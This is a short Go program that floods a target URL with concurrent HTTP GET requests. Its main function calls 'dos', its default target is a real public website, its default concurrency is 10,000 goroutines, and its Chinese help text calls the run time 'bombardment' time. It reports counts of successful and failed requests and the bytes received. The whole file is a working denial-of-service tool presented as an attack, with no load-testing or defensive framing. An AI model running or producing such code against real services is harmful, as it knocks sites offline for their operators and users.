package main

import (
	"flag"
	"fmt"
	"net/http"
	"time"
)

var (
	pl = fmt.Println
	pf = fmt.Printf
)

func main() {
	var (
		url                 string
		concurrent, timeSec int
	)
	flag.StringVar(&url, "url", "http://baidu.com", "要访问的url")
	flag.IntVar(&concurrent, "c", 10000, "并发数")
	flag.IntVar(&timeSec, "time", 1, "轰炸的时间s")
	flag.Parse()
	dos(url, concurrent, timeSec)
}
func dos(url string, concurrency int, timeSec int) {
	var successCount, failedCount, contentLen int
	quit := time.After(time.Minute * time.Duration(timeSec))
	begin := time.Now()
	fmt.Println(begin.Format("2006-01-02 15:04:05"))
	contItemLen := make(chan int, concurrency)
	fail := make(chan byte, concurrency)
	for i := 0; i < concurrency; i++ {
		go spider(url, contItemLen, fail)
	}
	outputContentLenTicker := time.NewTicker(10 * time.Second)
	go func() {
		for t := range outputContentLenTicker.C {
			if contentLen == 0 {
				continue
			}
			duration := t.Sub(begin)
			fmt.Printf(" ticker 共用时%.2f\n 成功%d次\n 失败%d次\n 总字节数%.2fM\n",
				duration.Seconds(), successCount, failedCount, float32(contentLen/1024/1024))
		}
	}()
	for {
		select {
		case t := <-contItemLen:
			successCount++
			contentLen += t
			go spider(url, contItemLen, fail)
		case <-fail:
			failedCount++
			go spider(url, contItemLen, fail)
		case <-quit:
			end := time.Now()
			duration := end.Sub(begin)
			fmt.Printf("访问%s\n 共用时%.2f\n 成功%d次\n 失败%d次\n 总字节数%.2fM\n",
				url, duration.Seconds(), successCount, failedCount, float32(contentLen/1024/1024))
			fmt.Println(end.Format("2006-01-02 15:04:05"))
			outputContentLenTicker.Stop()
			return
		}
	}
}
func spider(url string, contItemLen chan int, fail chan byte) {
	resp, err := http.Get(url)
	if err != nil {
		fail <- 0
		return
	}
	defer resp.Body.Close()
	// body, err := ioutil.ReadAll(resp.Body)
	// contentLen := len(body)
	contItemLen <- int(resp.ContentLength)
}
